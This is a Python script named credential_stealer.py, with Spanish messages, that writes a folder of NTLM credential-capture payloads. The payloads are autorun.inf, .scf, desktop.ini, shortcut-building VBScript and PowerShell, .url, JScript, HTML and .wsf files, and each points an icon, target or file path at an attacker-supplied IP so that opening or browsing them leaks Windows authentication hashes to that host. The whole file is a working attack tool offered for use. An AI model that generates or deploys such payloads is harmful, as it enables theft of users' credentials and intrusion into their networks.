import sys
import os

def create_autorun(ip : str):
    with open('payloads/autorun.inf', 'w') as file:
        file.write("[autorun]\n")
        file.write(f"open=\\\\{ip}\\test.exe\n")
        file.write("icon=test.ico\n")
        file.write("action=open Setup.exe\n")

def create_scf(ip : str):
    with open('payloads/st.scf', 'w') as file:
        file.write("[Shell]\n")
        file.write("Command=2\n")
        file.write(f"IconFile=\\\\{ip}\\test.ico\n")
        file.write("[Taskbar]\n")
        file.write("Command=ToggleDesktop\n")

def create_destktopini(ip : str):
    with open('payloads/desktop.ini', 'w') as file:
        file.write("[.ShellClassInfo]\n")
        file.write(f"IconResource=\\\\{ip}\\test.ico\n")
    with open('payloads/desktop.ini-old', 'w') as file:
        print("Archivo .ini-old para XP y anteriores, es necesario renombrar\n")
        file.write("[.ShellClassInfo]\n")
        file.write(f"IconFile=\\\\{ip}\\test.ico\n")
        file.write(f"IconIndex=1337")

def create_lnk(ip : str):
    with open('payloads/st.lnk', 'w') as file:
        file.write("""Set shl = CreateObject("WScript.Shell")\n""")
        file.write(""""Set fso = CreateObject("Scripting.FileSystemObject")\n""")
        file.write("currentFolder = shl.CurrentDirectory")
        file.write("""Set sc = shl.CreateShortcut(fso.BuildPath(currentFolder, "\Hsh.lnk"))\n""")
        file.write(f"""sc.TargetPath = "\\\\{ip}\\test"\n""")
        file.write("sc.WindowStyle = 1")
        file.write("""sc.HotKey = "Ctrl+Alt+O"\n""")
        file.write("""sc.IconLocation = "%windir%\system32\shell32.dll, 3"\n""")
        file.write("""sc.Description = "Holy molly"\n""")
        file.write("""sc.Save""")

def create_ps1(ip : str):
    with open('payloads/st-path.ps1', 'w') as file:
        file.write("""$objShell = New-Object -ComObject WScript.Shell\n""")
        file.write("""$lnk = $objShell.CreateShortcut("Hsh.lnk")\n""")
        file.write(f"""$lnk.TargetPath = "\\\\{ip}\\test"\n""")
        file.write("""$lnk.WindowStyle = 1\n""")
        file.write("""$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"\n""")
        file.write("""$lnk.Description = "Holy molly"\n""")
        file.write("""$lnk.HotKey = "Ctrl+Alt+O"\n""")
        file.write("""$lnk.Save()\n""")
    with open('payloads/st-icon.ps1', 'w') as file:
        file.write("""$wsh = new-object -ComObject wscript.shell\n""")
        file.write(""""$shortcut = $wsh.CreateShortcut("\\\\dc\software\\Hsh.lnk")\n""")
        file.write(f"""$shortcut.IconLocation = "\\\\{ip}\\test.ico"\n""")
        file.write("""$shortcut.Save()\n""")
    with open('payloads/st-basic.ps1', 'w') as file:
        file.write(f'Invoke-Item \\\\{ip}\\test\n')
        file.write(f'Get-Content \\\\{ip}\\test\n')
        file.write(f'Start-Process \\\\{ip}\\test\n')

def create_url(ip : str):
    with open('payloads/st.url', 'w') as file:
        file.write('[InternetShortcut]\n')
        file.write(f'URL=file://{ip}/test\n')


def create_js(ip : str):
    with open('payloads/st.js', 'w') as file:
        file.write('var fso = new ActiveXObject("Scripting.FileSystemObject")\n')
        file.write(f'fso.FileExists("//{ip}/test")\n')
    with open('payloads/st-js.html', 'w') as file:
        file.write('<html>\n')
        file.write('<script type="text/Jscript">\n')
        file.write('var fso = new ActiveXObject("Scripting.FileSystemObject")\n')
        file.write(f'fso.FileExists("//{ip}/test")\n')
        file.write('</script>\n')
        file.write('</html>\n')

def create_wsf(ip : str):
    with open('payloads/st.wsf', 'w') as file:
        file.write('<package>\n')
        file.write('\t<job id="test">\n')
        file.write('\t\t<script language="VBScript>"\n')
        file.write('\t\t\tSet fso = CreateObject("Scripting.FileSystemObject")\n')
        file.write(f'\t\t\tSet file = fso.OpenTextFile("//{ip}/test", 1)\n')
        file.write('\t\t</script>"\n')
        file.write('\t</job>\n')
        file.write('</package>\n')



if __name__ == '__main__':
    print("Este script genera payloads basicos, para payloads avanzados (docx, pdf...) se recomienda:")
    print("https://github.com/Greenwolf/ntlm_theft")
    print("Based on: https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds")
    
    args = sys.argv
    
    if len(args) < 2:
        print("Uso: python credential_stealer.py <ip>")
    else:
        ip = args[1]
        try:
            os.mkdir('payloads')
        except:
            print("No se ha podido crear el directorio, si existe este error es normal, en caso contrario revise los permisos")
        create_autorun(ip)
        create_destktopini(ip)
        create_js(ip)
        create_lnk(ip)
        create_ps1(ip)
        create_url(ip)
        create_wsf(ip)
        create_scf(ip)